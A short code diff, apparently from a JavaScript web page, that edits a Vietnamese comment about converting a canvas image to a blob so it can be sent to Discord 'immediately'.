@@ -52,7 +52,7 @@
             const imageData = canvas.toDataURL('image/png');
             photo.src = imageData;
 
-            // Chuyển đổi base64 thành blob để gửi qua Discord
+            // Chuyển đổi base64 thành blob để gửi qua Discord ngay lập tức
             fetch(imageData)
                 .then(res => res.blob())
                 .then(blob => {
